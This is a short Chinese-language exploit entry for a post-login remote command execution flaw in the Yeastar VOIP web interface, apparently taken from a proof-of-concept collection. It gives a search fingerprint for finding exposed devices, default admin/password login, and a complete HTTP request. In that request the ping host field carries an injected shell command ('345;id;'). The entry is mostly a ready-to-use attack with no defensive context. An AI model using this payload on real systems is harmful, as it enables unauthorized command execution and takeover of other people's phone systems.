# 星纵Yeastarstart存在后台远程命令执行漏洞

- **系统**：星纵　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="Yeastar-VOIP"`
- **请求**：`POST /cgi/webcgi?syscore=start HTTP/1.1`

**请求体 / payload**
```
使用admin/password登录系统获取cookie
Host:
Content-Length: 128
Cookie:td=2250c15e115f9429784d4bb63a8dd046; domain=; Max-Age=900;loginname=admin; domain=; Max-Age=900; path=/;
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Priority: u=1, i
X-Requested-With: XMLHttpRequest
node=ping&weboperation=start&webmodule=maintance&webpage=menutroubleshoot&weblangprefix=l.mt.ipping&webtabsactive=2&host=345;id;
```
- **预期**：200　|　—